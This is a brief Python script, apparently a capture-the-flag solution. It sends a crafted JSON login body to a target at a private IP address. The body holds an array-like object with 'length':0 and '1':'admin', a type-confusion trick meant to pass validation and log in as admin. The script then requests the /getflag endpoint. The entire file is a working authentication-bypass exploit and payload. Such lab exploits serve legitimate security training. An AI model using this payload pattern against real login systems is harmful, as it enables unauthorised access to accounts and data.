import requests

def exp(url):
    sess = requests.Session()
    print(sess.post(url + '/login',json={ "usernames": [{"length":0,"1":"admin"}] }).text)

    print(sess.get(url + '/getflag').text)

if __name__=="__main__":
    exp("http://10.104.255.222")
